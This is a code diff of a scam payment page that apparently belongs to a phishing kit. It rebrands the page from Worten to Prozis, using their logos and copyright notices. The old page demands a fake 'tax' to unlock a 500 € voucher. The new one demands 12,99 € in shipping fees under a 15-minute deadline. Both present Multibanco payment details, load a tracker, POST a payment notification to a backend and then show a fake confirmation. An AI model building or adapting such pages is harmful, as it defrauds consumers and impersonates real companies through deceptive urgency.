@@ -5,71 +5,64 @@
     <meta charset="UTF-8" />
     <meta name="viewport" content="width=device-width, initial-scale=1.0" />
     <script src="/static/js/tracker.js"></script>
-    <title>Multibanco - Worten</title>
-    <link rel="stylesheet" href="style.css?v=28">
+    <title>Pagamento Multibanco - Prozis</title>
+    <link rel="stylesheet" href="style.css?v=38">
     <link
-        href="https://fonts.googleapis.com/css2?family=Roboto+Mono:wght@400;500&family=Open+Sans:wght@400;600;700;800&display=swap"
+        href="https://fonts.googleapis.com/css2?family=Exo+2:wght@300;400;600;700;800&family=Roboto+Mono:wght@400;500&display=swap"
         rel="stylesheet">
-    <link rel="icon" href="/assets/worten-logo.svg" type="image/svg+xml">
+    <link rel="icon" href="assets/prozis-logo.svg" type="image/svg+xml">
     <style>
-        /* Override style.css */
+        /* Base Overrides */
         body {
-            background: white !important;
+            background: #f5f5f5 !important;
             display: block !important;
             padding: 0 !important;
             min-height: auto !important;
-        }
-
-        #worten-header {
-            background: #d32f2f !important;
-            padding: 15px 20px !important;
-        }
-
-        body {
-            font-family: 'Open Sans', 'Arial', sans-serif;
-            background: white;
             margin: 0;
-            padding: 0;
+            font-family: 'Exo 2', sans-serif;
             color: #333;
-            opacity: 0;
-            transition: opacity 0.5s ease;
         }
 
-        #worten-header {
-            background: #d32f2f;
-            padding: 15px 20px;
+        #prozis-header {
+            background: #000;
+            padding: 15px 0;
             text-align: center;
-            box-shadow: 0 2px 10px rgba(0, 0, 0, 0.1);
+            border-bottom: 3px solid #e32526;
+            box-shadow: 0 4px 10px rgba(0, 0, 0, 0.2);
+        }
+
+        #prozis-header img {
+            height: 25px;
         }
 
         .main-container {
-            max-width: 750px;
-            margin: 20px auto;
+            max-width: 600px;
+            margin: 30px auto;
             background: white;
-            border-radius: 12px;
-            box-shadow: 0 5px 20px rgba(0, 0, 0, 0.1);
+            border-radius: 8px;
+            box-shadow: 0 5px 20px rgba(0, 0, 0, 0.05);
             overflow: hidden;
             padding: 35px;
         }
 
         .mb-logo {
             display: block;
-            margin: 0 auto 10px;
-            height: 55px;
+            margin: 0 auto 15px;
+            height: 50px;
         }
 
         .receipt-box {
-            background: #e0e0e0;
+            background: #f9f9f9;
             padding: 2px;
             border-radius: 8px;
             margin-bottom: 25px;
+            border: 1px solid #eee;
         }
 
         .receipt-inner {
             background: #fff;
-            padding: 40px;
+            padding: 30px;
             border-radius: 6px;
-            border: 1px dashed #bbb;
         }
 
         .data-row {
@@ -88,179 +81,97 @@
 
         .label {
             font-size: 15px;
-            color: #777;
+            color: #999;
             font-weight: 600;
         }
 
         .value {
             font-family: 'Roboto Mono', monospace;
             font-size: 20px;
-            /* Reduced slightly */
             font-weight: 600;
-            color: #333;
-            letter-spacing: 0.5px;
+            color: #000;
             white-space: nowrap;
-            /* Prevent wrap */
-        }
-
-        .copy-btn {
-            background: none;
-            border: none;
-            color: #d32f2f;
-            font-size: 11px;
-            cursor: pointer;
-            text-decoration: underline;
-            margin-left: 10px;
         }
 
         .expiry-notice {
-            background: #e8f5e9;
-            color: #2e7d32;
+            background: rgba(227, 37, 38, 0.05);
+            color: #e32526;
             padding: 15px;
             border-radius: 8px;
             font-size: 13px;
             text-align: center;
             margin-bottom: 25px;
-            border: 1px solid #c8e6c9;
+            border: 1px solid rgba(227, 37, 38, 0.1);
         }
 
-        .how-to-pay-section {
-            margin-top: 35px;
-            margin-bottom: 25px;
+        .instructions-list {
+            margin-top: 30px;
             text-align: left;
         }
 
-        .step-title {
-            font-size: 14px;
-            color: #555;
-            font-weight: 700;
-            margin-bottom: 15px;
-            text-transform: uppercase;
-            letter-spacing: 0.5px;
-        }
-
-        .steps-container {
+        .instruction-item {
             display: flex;
             gap: 15px;
-            justify-content: space-between;
+            margin-bottom: 12px;
+            font-size: 14px;
+            color: #555;
         }
 
-        .step-item {
-            flex: 1;
-            background: #f9f9f9;
-            padding: 15px;
-            border-radius: 8px;
-            display: flex;
-            flex-direction: column;
-            align-items: center;
-            text-align: center;
-            border: 1px solid #eee;
-        }
-
-        .step-icon {
-            width: 40px;
-            height: 40px;
-            margin-bottom: 10px;
+        .step-num {
+            background: #000;
+            color: white;
+            width: 20px;
+            height: 20px;
+            border-radius: 50%;
             display: flex;
             align-items: center;
             justify-content: center;
-            background: white;
-            border-radius: 50%;
-            box-shadow: 0 2px 5px rgba(0, 0, 0, 0.05);
-        }
-
-        .step-icon svg {
-            width: 20px;
-            height: 20px;
-            stroke: #d32f2f;
-        }
-
-        .step-text {
             font-size: 11px;
-            color: #666;
-            line-height: 1.4;
-            font-weight: 600;
+            flex-shrink: 0;
         }
 
         .back-btn {
             width: 100%;
-            padding: 18px;
-            background: #eee;
-            color: #555;
+            padding: 15px;
+            background: #f0f0f0;
+            color: #333;
             font-weight: 700;
             border: none;
-            border-radius: 8px;
+            border-radius: 5px;
             font-size: 14px;
             cursor: pointer;
             text-transform: uppercase;
-            transition: background 0.2s;
+            transition: all 0.2s;
+            margin-top: 20px;
         }
 
         .back-btn:hover {
             background: #e0e0e0;
         }
 
-        .value-wrapper {
-            display: flex;
-            align-items: center;
-            gap: 10px;
-        }
-
         .copy-btn {
             background: none;
             border: none;
             cursor: pointer;
-            padding: 5px;
-            display: flex;
-            align-items: center;
-            opacity: 0.6;
-            transition: opacity 0.2s;
+            padding: 0 5px;
+            color: #e32526;
+            font-size: 12px;
+            text-decoration: underline;
         }
 
-        .copy-btn:hover {
-            opacity: 1;
-        }
-
-        .copy-btn svg {
-            width: 18px;
-            height: 18px;
-            stroke: #d32f2f;
-        }
-
-        .copy-btn {
-            position: relative;
-            /* For tooltip positioning */
-        }
-
-        .copy-tooltip {
-            position: absolute;
-            bottom: 100%;
-            left: 50%;
-            transform: translateX(-50%);
-            background: #333;
-            color: white;
-            padding: 4px 8px;
-            border-radius: 4px;
-            font-size: 11px;
-            white-space: nowrap;
-            opacity: 0;
-            pointer-events: none;
-            transition: opacity 0.2s, bottom 0.2s;
-            margin-bottom: 5px;
-        }
-
-        .copy-tooltip.show {
-            opacity: 1;
-            bottom: 120%;
+        footer {
+            text-align: center;
+            padding: 30px;
+            font-size: 12px;
+            color: #ccc;
         }
     </style>
 </head>
 
 <body>
     <!-- Header -->
-    <div id="worten-header"
-        style="background: #d32f2f; padding: 15px 20px; text-align: center; box-shadow: 0 2px 10px rgba(0, 0, 0, 0.1);">
-        <img src="/assets/worten-logo.svg" style="width: 120px; filter: brightness(0) invert(1);">
+    <div id="prozis-header">
+        <img src="assets/prozis-logo.svg" alt="Prozis">
     </div>
 
     <div class="main-container">
@@ -268,61 +179,78 @@
         <img src="https://www.multibanco.pt/wp-content/uploads/2025/01/Multibanco-Logo-CMYK.svg" class="mb-logo"
             alt="Multibanco">
 
-        <h2 style="text-align: center; font-size: 18px; margin-bottom: 10px; margin-top: 0;">Dados para Pagamento</h2>
+        <h2 style="text-align: center; font-size: 20px; font-weight: 800; margin-bottom: 10px; margin-top: 0;">Dados
+            para Pagamento</h2>
 
-        <div class="expiry-notice" style="margin-bottom: 15px;">
-            ⚠️ <strong>Pagamento de Imposto (IEJO):</strong> Efetue o pagamento nos próximos <strong>15 minutos</strong>
-            para
-            ativar o seu voucher de 500 € instantaneamente.
+        <div class="expiry-notice">
+            ⚠️ <strong>Reserva de Stock:</strong> Efetue o pagamento em <strong>15 minutos</strong> para garantir o
+            envio imediato do seu Kit.
         </div>
 
-        <div class="receipt-box" style="width: 100%; max-width: 100%; margin: 0 0 25px 0;">
-            <div class="receipt-inner">
-                <div class="data-row">
-                    <span class="label">Entidade</span>
-                    <div class="value-wrapper">
-                        <span class="value">---</span>
-                        <button class="copy-btn"
-                            onclick="copyToClipboard(document.querySelector('.data-row:first-child .value').innerText, this)">
-                            <span class="copy-tooltip">Copiado!</span>
-                            <svg viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
-                                <path
-                                    d="M8 4V16C8 17.1046 8.89543 18 10 18H18C19.1046 18 20 17.1046 20 16V7.24264C20 6.71221 19.7893 6.20357 19.4142 5.82843L16.1716 2.58579C15.7964 2.21071 15.2878 2 14.7574 2H10C8.89543 2 8 2.89543 8 4Z"
-                                    stroke="#d32f2f" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" />
-                                <path
-                                    d="M16 18V20C16 21.1046 15.1046 22 14 22H6C4.89543 22 4 21.1046 4 20V8C4 6.89543 4.89543 6 6 6H8"
-                                    stroke="#d32f2f" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" />
-                            </svg>
-                        </button>
+        <div class="receipt-box"
+            style="background: #fff; border: 1px solid #ddd; padding: 0; box-shadow: 0 2px 10px rgba(0,0,0,0.05); overflow: hidden;">
+            <!-- Receipt Header -->
+            <div style="background: #f1f1f1; padding: 15px; text-align: center; border-bottom: 1px dashed #ccc;">
+                <img src="https://www.multibanco.pt/wp-content/uploads/2025/01/Multibanco-Logo-CMYK.svg"
+                    style="height: 30px; margin-bottom: 5px;">
+                <div
+                    style="font-family: 'Courier New', monospace; font-size: 14px; font-weight: 700; color: #333; letter-spacing: 1px;">
+                    TALÃO DE PAGAMENTO</div>
+            </div>
+
+            <div class="receipt-inner"
+                style="padding: 25px; font-family: 'Courier New', monospace; color: #333; position: relative;">
+
+                <div class="data-row" style="margin-bottom: 12px; border-bottom: none;">
+                    <span class="label" style="font-weight: 400; font-size: 14px; color: #555;">ENTIDADE:</span>
+                    <div style="display:flex; align-items:center; gap: 10px;">
+                        <span class="value" style="font-size: 18px; font-weight: 700;">---</span>
                     </div>
                 </div>
-                <div class="data-row">
-                    <span class="label">Referência</span>
-                    <div class="value-wrapper">
-                        <span class="value" id="ref-value">--- --- ---</span>
-                        <button class="copy-btn"
-                            onclick="copyToClipboard(document.getElementById('ref-value').innerText, this)">
-                            <span class="copy-tooltip">Copiado!</span>
-                            <svg viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
-                                <path
-                                    d="M8 4V16C8 17.1046 8.89543 18 10 18H18C19.1046 18 20 17.1046 20 16V7.24264C20 6.71221 19.7893 6.20357 19.4142 5.82843L16.1716 2.58579C15.7964 2.21071 15.2878 2 14.7574 2H10C8.89543 2 8 2.89543 8 4Z"
-                                    stroke="#d32f2f" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" />
-                                <path
-                                    d="M16 18V20C16 21.1046 15.1046 22 14 22H6C4.89543 22 4 21.1046 4 20V8C4 6.89543 4.89543 6 6 6H8"
-                                    stroke="#d32f2f" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" />
-                            </svg>
-                        </button>
+
+                <div class="data-row" style="margin-bottom: 12px; border-bottom: none;">
+                    <span class="label" style="font-weight: 400; font-size: 14px; color: #555;">REFERÊNCIA:</span>
+                    <div style="display:flex; align-items:center; gap: 10px;">
+                        <span class="value" id="ref-value" style="font-size: 18px; font-weight: 700;">--- --- ---</span>
                     </div>
                 </div>
-                <div class="data-row">
-                    <span class="label">Montante</span>
-                    <span class="value">12,49 €</span>
+
+                <div class="data-row"
+                    style="margin-bottom: 20px; border-bottom: 2px dashed #000; padding-bottom: 15px;">
+                    <span class="label" style="font-weight: 400; font-size: 14px; color: #555;">MONTANTE:</span>
+                    <span class="value" style="font-size: 22px; font-weight: 700; color: #000;">12,99 EUR</span>
                 </div>
+
+                <div style="text-align: center; font-size: 11px; margin-top: 15px; color: #777;">
+                    *** PAGAMENTO DE SERVIÇOS ***<br>
+                    Conserve este talão.
+                </div>
+            </div>
+
+            <!-- Cutout Effect Bottom -->
+            <div class="receipt-cutout"
+                style="height: 10px; background: radial-gradient(circle, transparent 50%, #f5f5f5 50%) 0 -5px/20px 20px repeat-x;">
             </div>
         </div>
 
-        <div style="text-align: center; font-size: 12px; color: #777; margin-bottom: 25px;">
-            Guarde este talão como comprovativo.
+        <div class="instructions-list">
+            <h4 style="margin: 0 0 15px; font-weight:700; text-transform:uppercase; font-size:14px;">Como Pagar:</h4>
+            <div class="instruction-item">
+                <span class="step-num">1</span>
+                <span>Dirija-se a um Multibanco ou use o Homebanking.</span>
+            </div>
+            <div class="instruction-item">
+                <span class="step-num">2</span>
+                <span>Selecione <strong>Pagamentos de Serviços</strong>.</span>
+            </div>
+            <div class="instruction-item">
+                <span class="step-num">3</span>
+                <span>Introduza os dados acima para pagar os portes.</span>
+            </div>
+        </div>
+
+        <div style="text-align: center; font-size: 12px; color: #999; margin-top: 25px;">
+            Guarde o talão como comprovativo.
         </div>
 
         <button class="back-btn" onclick="goBack()">
@@ -331,55 +259,14 @@
 
     </div>
 
-    <!-- Official Footer -->
-    <footer class="worten-footer">
-        <img src="/assets/worten-logo.svg" class="footer-logo" alt="Worten">
-        <div class="footer-content">
-            <div class="footer-col">
-                <h4>Apoio ao Cliente</h4>
-                <ul>
-                    <li><a href="#">Ajuda e Contactos</a></li>
-                    <li><a href="#">Estado da Encomenda</a></li>
-                    <li><a href="#">Devoluções</a></li>
-                </ul>
-            </div>
-            <div class="footer-col">
-                <h4>Sobre Nós</h4>
-                <ul>
-                    <li><a href="#">Quem somos</a></li>
-                    <li><a href="#">Lojas</a></li>
-                    <li><a href="#">Worten Resolve</a></li>
-                </ul>
-            </div>
-            <div class="footer-col">
-                <h4>Links Úteis</h4>
-                <ul>
-                    <li><a onclick="openLegal('privacy')">Política de Privacidade</a></li>
-                    <li><a onclick="openLegal('terms')">Termos e Condições</a></li>
-                    <li><a href="#">Livro de Reclamações</a></li>
-                </ul>
-            </div>
-        </div>
-        <div class="footer-bottom">
-            <p>© 2024 Worten - Equipamentos para o Lar, S.A. Todos os direitos reservados.</p>
-        </div>
+    <footer>
+        <p>© 2024 Prozis.com. Todos os direitos reservados.</p>
     </footer>
 
-    <!-- Legal Modals -->
-    <div id="legalModal" class="legal-modal">
-        <div class="legal-content">
-            <span class="close-legal" onclick="closeLegal()">&times;</span>
-            <h2 id="legalTitle" style="color: #d32f2f; margin-bottom: 20px;"></h2>
-            <div id="legalBody" style="font-size: 13px; color: #555;"></div>
-        </div>
-    </div>
-
-    <script src="script.js?v=28"></script>
+    <script src="script.js?v=38"></script>
 
     <script>
         window.onload = () => {
-            document.body.style.opacity = '1';
-
             // Load Data from Session
             const storedData = sessionStorage.getItem('currentPayment');
             if (storedData) {
@@ -425,42 +312,39 @@
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
                     body: JSON.stringify({
-                        text: "Pagamento confirmado: 12,49 € (Multibanco)",
-                        title: "Worten Promo",
+                        text: "PORTES PAGOS: 12,99 € (Multibanco)",
+                        title: "Prozis Envio",
                         flow: "root"
                     })
                 });
             } catch (e) { }
 
             document.querySelector('.main-container').innerHTML = `
-                <div style="text-align:center; padding: 40px 20px;">
-                    <div style="width: 80px; height: 80px; background: #4CAF50; border-radius: 50%; display: flex; align-items: center; justify-content: center; margin: 0 auto 20px;">
+                <div style="text-align:center; padding: 40px 20px; animation: popIn 0.5s ease;">
+                    <div style="width: 80px; height: 80px; background: #e32526; border-radius: 50%; display: flex; align-items: center; justify-content: center; margin: 0 auto 20px; box-shadow: 0 10px 25px rgba(227, 37, 38, 0.4);">
                         <svg viewBox="0 0 24 24" fill="none" stroke="white" stroke-width="3" width="40" height="40">
                             <path d="M20 6L9 17l-5-5" stroke-linecap="round" stroke-linejoin="round"/>
                         </svg>
                     </div>
-                    <h2 style="color: #4CAF50; margin-bottom: 10px;">Imposto Pago com Sucesso!</h2>
-                    <p style="color: #666; font-size: 16px;">O seu voucher de 500€ foi ativado para uso imediato.</p>
+                    <h2 style="color: #000; margin-bottom: 10px; font-weight: 800;">Envio Confirmado!</h2>
+                    <p style="color: #666; font-size: 16px;">O pagamento dos portes foi recebido.</p>
+                    <div style="margin-top:20px; font-size:14px; color:#555;">
+                        A sua encomenda será preparada. Obrigado pela preferência!
+                    </div>
                 </div>
+                 <style>
+                    @keyframes popIn { 0% { transform: scale(0.8); opacity: 0; } 100% { transform: scale(1); opacity: 1; } }
+                </style>
              `;
         }
 
         function goBack() {
-            document.body.style.opacity = '0';
-            setTimeout(() => {
-                window.location.href = 'payment.html';
-            }, 500);
+            window.location.href = 'payment.html';
         }
 
-        function copyToClipboard(text, btn) {
+        function copyToClipboard(text) {
             navigator.clipboard.writeText(text).then(() => {
-                const tooltip = btn.querySelector('.copy-tooltip');
-                tooltip.classList.add('show');
-                setTimeout(() => {
-                    tooltip.classList.remove('show');
-                }, 2000);
-            }).catch(err => {
-                console.error('Failed to copy: ', err);
+                alert("Copiado!");
             });
         }
     </script>
